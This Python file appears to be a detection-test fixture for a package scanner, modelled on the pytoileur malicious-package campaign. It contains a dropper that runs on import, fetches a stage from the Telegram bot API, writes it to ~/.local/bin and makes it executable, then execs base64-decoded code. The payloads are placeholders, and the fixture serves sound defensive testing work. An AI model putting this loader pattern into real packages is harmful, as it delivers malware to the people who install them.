# pytoileur@1.0.0 (May 28 2024). 'Cool package' campaign — the
# attacker spammed StackOverflow answers recommending pytoileur as
# a fake helper, then the install dropped a Telegram-bot-driven
# RAT (Cool.exe / Runtime.exe / Updater.exe variants). Public
# write-up: https://socket.dev/blog/cool-package-recommended
#
# Detection target:
#   - dynamic-eval          (exec(b64decode(...)))
#   - base64-decode         (the b64decode call)
#   - net-egress            (urllib.request fetch + Telegram bot API)
#   - fs-write-outside-root (drops payload to %APPDATA% / ~/.local/bin)
#   - suspicious-url        (api.telegram.org on blocklist)

import base64
import os
import urllib.request


def _bootstrap():
    # Stage 1: fetch the second stage from Telegram's bot file API,
    # which terminates on api.telegram.org — host-blocklist hit.
    url = "https://api.telegram.org/bot00000:XXX/getFile?file_id=stage2"
    encoded = urllib.request.urlopen(url).read()

    # Decode + drop to disk.
    binary = base64.b64decode(encoded)
    drop_path = os.path.expanduser("~/.local/bin/.cache-helper")
    with open(drop_path, "wb") as f:
        f.write(binary)
    os.chmod(drop_path, 0o755)

    # exec stage 3 inline.
    stage3 = base64.b64decode(b"cHJpbnQoJ2hpJyk=")
    exec(stage3)


_bootstrap()
